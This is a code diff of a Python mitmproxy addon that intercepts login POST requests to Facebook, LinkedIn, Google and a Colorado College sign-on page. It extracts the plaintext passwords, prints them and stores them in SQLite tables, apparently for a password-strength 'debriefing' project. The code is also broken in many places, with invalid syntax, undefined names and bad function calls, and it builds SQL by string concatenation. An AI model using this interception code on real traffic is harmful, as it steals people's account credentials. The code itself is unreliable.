@@ -1,4 +1,4 @@
-import mitmproxy, sqlite3, random
+import mitmproxy, sqlite3, os, base64, sys
 
 class MITM_Interface:
 
@@ -7,7 +7,9 @@ class MITM_Interface:
 		self.connex = sqlite3.connect(self.dbName)
 		self.cur = self.connex.cursor()
 		self.cpu_factor = 0
+		self.new_user = True #replace this with more sophisticated check
 
+	#hashmaps for use when sending to debriefing page
 	def tableA_vals(self, user_id, pword_id, associated_account, password_length, strength):
 		return {"user_id" : user_id,
 		"pword_id" : pword_id,
@@ -28,46 +30,97 @@ class MITM_Interface:
 
 		--> number of years to crack?
 		'''
-		pass
+		return -1
 
 	def new_user_id(self):
-		pass
+		return os.urandom(8) if self.new_user
 
-	def check_for_shared_passwords(self):
+	def check_for_shared_passwords(self,):
 		'''checks traffic for shared passwords'''
-		pass
+
+		return None
 
 	def read_traffic(self, account, password):
 		'''makes decisions based on account names and passwords from mitmproxy : inserts into table(s), makes a new userID, etc'''
-		self.check_for_shared_passwords()
+		u_id = str(self.new_user_id())
+		p_id = str(os.urandom(10))
+		pword_length = str(password.length())
+		print("password: ", password)
+		print("length of password: ", pword_length)
+		strength = self.assign_strength(password)
+		num_shared = self.check_for_shared_passwords()
+		self.insert_into_tables()
 		pass
 
 	def initTableA(self):
-		query = 'CREATE TABLE IF NOT EXISTS TableA' \
-				'(user_id TEXT PRIMARY KEY NOT NULL,' \
-				'pword_id TEXT UNIQUE NOT NULL,' \
-				'associated_account TEXT NOT NULL,' \
-				'strength INTEGER NOT NULL)'
-		self.cur.execute(query)
-		self.connex.commit()
-
-	def insert_into_tables(self, user_id, pword_id, associated_account, password_length, strength, number_shared_passwords):
 		try:
+			query = 'CREATE TABLE IF NOT EXISTS TableA' \
+					'(user_id TEXT PRIMARY KEY NOT NULL,' \
+					'pword_id TEXT UNIQUE NOT NULL,' \
+					'associated_account TEXT NOT NULL,' \
+					'strength INTEGER NOT NULL)'
+			self.cur.execute(query)
+			self.connex.commit()
+		except sqlite3.Error as SQE:
+			print("error inserting record:", SQE)
+			pass
+
+	def initTableS(self, u_id):
+		print("creating new secure table..")
+		try:
+			query = 'CREATE TABLE IF NOT EXISTS Table' + str(u_id) + ' ' +  \
+					'(user_id TEXT PRIMARY KEY NOT NULL,' \
+					'associated_account TEXT NOT NULL,' \
+					'password BLOB NOT NULL)'
+			print("table" + str(uid) + " created...")
+			self.cur.execute(query)
+			self.connex.commit()
+		except sqlite3.Error as SQE:
+			print("error inserting record:", SQE)
+			pass
+
+	def get_user_pword_table(self, u_id):
+        try:
+        	table_s = str(uid)
+            self.cur.execute("SELECT * FROM Table" + table_s + " WHERE username_hash = [?,?,?]", [username_hash, associated_account, password])
+            pw_db = self.cur.fetchone()
+            if not pw_db:
+                raise sqlite3.Error
+            print("got enc'd user db")
+            return pw_db
+        except sqlite3.Error as SQE:
+            print("error updating record:", SQE)
+            return None
+
+
+	def insert_into_tables(self, user_id, pword_id, associated_account, password_length, strength, number_shared_passwords, password):
+		password = base64.b64encode()
+        table_s = str(uid)
+		try:
+			print("adding to table a...")
 			self.cur.execute("INSERT OR IGNORE INTO TableA VALUES (?,?,?,?,?)", [user_id, pword_id, associated_account, password_length, strength])
 			self.connex.commit()
+			print("adding to table b...")
 			self.cur.execute("INSERT OR IGNORE INTO TableB VALUES (?,?)", [user_id, number_shared_passwords])
 			self.connex.commit()
-			print("successfully inserted records into tables...")
+			if password is not None:
+				print("adding into secure table...")
+				self.cur.execute("INSERT INTO Table" + table_s + " VALUES (?, ?)", [user_id, associated_account, password])
+				print("successfully inserted records into tables...")
 		except sqlite3.Error as SQE:
 			print("error inserting record:", SQE)
 			pass
 
 	def initTableB(self):
-		query = 'CREATE TABLE IF NOT EXISTS TableB' \
-				'(user_id TEXT PRIMARY KEY NOT NULL,' \
-				'number_shared_passwords INTEGER NOT NULL)'
-		self.cur.execute(query)
-		self.connex.commit()
+        try:
+			query = 'CREATE TABLE IF NOT EXISTS TableB' \
+					'(user_id TEXT PRIMARY KEY NOT NULL,' \
+					'number_shared_passwords INTEGER NOT NULL)'
+			self.cur.execute(query)
+			self.connex.commit()
+        except sqlite3.Error as SQE:
+            print("error updating record:", SQE)
+            return None
 
 
 	def view_db(self):
@@ -96,24 +149,34 @@ class MITM_Interface:
 
 
 class Get_Pwords:
+	'''
+		TO DO:
+			add more sites
+	'''
+
+	def __init__(self):
+		self.interface = MITM_Interface_Interface()
+
+	def get_facebook(self,form, flow):
+		return self.interface.read_traffic("facebook", form['pass']) if form['pass'] and "facebook.com" in flow.request.headers[':authority'] else None
+
+	def get_linkedin(self,form, flow):
+		return self.interface.read_traffic("linkedin", form["session_password"]) if "linkedin.com" in flow.request.headers['Host'] and form['session_password'] else None
+
+	def get_google(self, form, flow):
+		return self.interface.read_traffic("google", form['Passwd']) if "Passwd" in form and form['Page'] == "PasswordSeparationSignIn" and "google.com" in flow.request.headers[':authority'] else None
+
+	def get_CC(self,form, flow):
+		return self.interface.read_traffic("cc_ssi", form['password']) if flow.request.headers['Host'] == "cas.coloradocollege.edu" and form['password'] else None
 
 	def request(self,flow):
-		'''
-		MITM_Interface instantiated here 
-		--> picks account name, passwords from mitmproxy traffic
-		'''
-		#mitm_script = MITM_Interface()
 		if flow.request.urlencoded_form and flow.request.method == 'POST':
 			form = flow.request.urlencoded_form
 			try:
-				if "pass" in form and "login_try_number" in flow.request.pretty_url:
-					print("account: Facebook, password:", form['pass'])
-				elif "Passwd" in form and form['Page'] == "PasswordSeparationSignIn" and "/signin/challenge/sl/password" in flow.request.pretty_url:
-					print("account: Gmail, password:", form['Passwd'])
-				elif "cas.coloradocollege.edu" in flow.request.pretty_url and form['password']:
-					print("account: CC SSI, password:", form['password'])
-				elif "linkedin.com" in flow.request.pretty_url and form['session_password']:
-					print("account: Linkedin, password:", form['session_password'])
+				self.get_google(form, flow)
+				self.get_CC(form, flow)
+				self.get_facebook(form, flow)
+				self.get_linkedin(form, flow)
 			except KeyError:
 				print("error supressed: key not in urlencoded_form")
 				pass
